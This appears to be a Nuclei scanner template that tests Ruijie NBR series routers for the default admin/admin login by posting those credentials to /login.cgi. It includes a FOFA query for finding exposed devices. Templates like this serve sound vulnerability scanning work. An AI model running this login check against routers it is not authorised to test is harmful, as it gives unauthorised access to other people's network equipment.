id: ruijie-nbr-default-login
info:
  name: Ruijie NBR Series Routers - Default Login
  author: pussycat0x
  severity: high
  description: |
    Ruijie NBR Series Routers Default Login username and password was discovered.
  metadata:
    runzero-match: service["http.body"] matches "(?i)上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
    fofa-query: body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
    max-request: 1
    verified: true
  tags: default-login,ruijie-nbr,vuln
http:
  - attack: pitchfork
    matchers:
      - part: body
        regex:
          - index\.htm\?_([0-9]+)
        type: regex
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
      username:
        - admin
    raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}/login.html

        user={{username}}&password={{password}}
    stop-at-first-match: true
